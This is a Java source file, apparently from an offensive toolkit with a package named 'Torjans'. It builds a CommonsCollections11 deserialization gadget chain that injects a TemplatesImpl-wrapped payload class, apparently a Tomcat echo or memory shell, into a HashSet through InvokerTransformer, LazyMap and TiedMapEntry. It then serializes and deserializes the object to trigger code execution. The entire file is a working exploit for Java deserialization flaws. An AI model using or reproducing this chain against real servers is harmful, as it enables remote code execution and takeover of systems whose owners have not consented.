package com.Jasetol.Torjans;

import com.Jasetol.payloads.URLDNS;
import com.Jasetol.utils.CreateTemplatesImpl;
import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.Reflect;
import com.Jasetol.utils.SerWithUnSer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.Jasetol.payloads.*;
import java.util.HashMap;
import java.util.HashSet;

public class CommonsCollections11InjectTemplatesImpl {

    public static Object getObject() throws Exception{
        //TemplatesImpl templatesImpl = CreateTemplatesImpl.createTemplatesImplToInjectTrojan("D:\\Jasetol\\src\\main\\java\\com\\Jasetol\\payloads\\shiro\\TomcatHeaderSize3.class");
        TemplatesImpl templatesImpl = CreateTemplatesImpl.createTemplatesImplToInjectTrojan(echoForTomcat03.class);
        HashSet hashSet = new HashSet();
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TiedMapEntry tiedMapEntry = new TiedMapEntry(null,null);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),invokerTransformer);
        Reflect.reflectSetField(tiedMapEntry,"map",lazyMap);
        hashSet.add(tiedMapEntry);
        Reflect.reflectSetField(tiedMapEntry,"key",templatesImpl);
        return hashSet;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        HashSet hashSet = (HashSet) getObject();
        byte[] bytes = SerWithUnSer.serialize(hashSet);
        SerWithUnSer.unSerialize(bytes);
    }
}
